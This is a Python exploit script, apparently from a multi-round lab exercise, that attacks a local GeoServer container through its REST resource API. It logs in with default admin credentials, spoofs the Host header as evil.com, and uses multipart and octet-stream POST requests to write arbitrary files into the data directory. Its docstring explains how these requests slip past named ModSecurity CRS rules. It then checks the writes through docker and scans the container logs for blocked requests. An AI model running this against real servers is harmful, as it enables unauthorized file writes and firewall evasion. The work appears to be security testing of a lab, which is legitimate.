# -*- coding: utf-8 -*-
"""Final round - GeoServer fourth volley: multipart resource upload via POST.

GeoServer REST supports POST /rest/resource/<dir> with multipart/form-data to
create a directory and upload files into the data dir. multipart/form-data is
in the CRS 920420 CT whitelist and POST is allowed by 911100 -> arbitrary file
write via pure feature abuse (deepens criterion (c) from dirs to files).
"""
import subprocess
import time

import requests
import urllib3

urllib3.disable_warnings()

BASE = "http://127.0.0.1:18382"
s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"
s.headers["Host"] = "evil.com"
AUTH = ("admin", "geoserver")


def show(label, r):
    txt = r.text
    if len(txt) > 160:
        txt = txt[:80] + "...[" + str(len(txt)) + "B]..." + txt[-60:]
    print("[*] %-46s HTTP %s | %s" % (label, r.status_code, txt.replace("\n", " ")[:150]))


def truth():
    out = subprocess.run(["docker", "exec", "multi-round-lab-geoserver-1", "sh", "-c",
                          "ls -lR --full-time /mnt/geoserver/data_dir/pwn_joint_dir 2>/dev/null; "
                          "ls -l --full-time /mnt/geoserver/data_dir/styles/pwn_joint_style.sld 2>/dev/null"],
                         capture_output=True, text=True, errors="replace")
    print("[truth]", (out.stdout + out.stderr).strip() or "(nothing)")


# multipart resource upload -> directory + file
files = {"file": ("pwn_joint.txt", b"pwn multipart resource write", "application/octet-stream")}
r = s.post(BASE + "/geoserver/rest/resource/pwn_joint_dir", files=files, auth=AUTH, timeout=60)
show("POST multipart /rest/resource/pwn_joint_dir", r)

# single-file variant: POST to the file path with octet-stream body
r = s.post(BASE + "/geoserver/rest/resource/pwn_joint_dir2/pwn_joint.txt",
           data=b"pwn post body write",
           headers={"Content-Type": "application/octet-stream"}, auth=AUTH, timeout=60)
show("POST octet /rest/resource/.../pwn_joint.txt", r)

time.sleep(2)
truth()

out = subprocess.run(["docker", "logs", "multi-round-lab-geoserver-1", "--since", "2m"],
                     capture_output=True, text=True, errors="replace")
for line in (out.stdout + out.stderr).splitlines():
    if "blocked" in line.lower():
        print("[rasp]", line.strip()[:200])
